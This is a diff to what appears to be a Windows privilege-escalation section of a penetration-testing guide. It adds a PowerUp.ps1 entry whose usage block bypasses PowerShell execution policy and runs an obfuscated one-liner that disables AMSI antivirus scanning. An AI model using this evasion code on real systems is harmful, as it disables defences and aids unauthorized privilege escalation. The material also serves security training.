@@ -834,6 +834,20 @@ The easiest way to gain access to another user is to gather credentials from a c
     ```  
 - Metasploit  
     If you already have a Meterpreter shell on the target system, you can use the `multi/recon/local_exploit_suggester` module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.
+- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
+    PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities.
+    <details>
+    <summary>Usage</summary>
+    ```
+    # Bypasse PowerShell’s execution policy
+    PS C:\> powershell -ep bypass
+    # Disable AMSI
+    sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+    # Runnnig PowerUp.ps1
+    PS C:\> Import-Module PowerUp.ps1
+    PS C:\> . .\PowerUp.ps1
+    ```
+    </details>
 
 ### Conclusion  
 - [PayloadsAllTheThings - Windows Privilege Escalation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
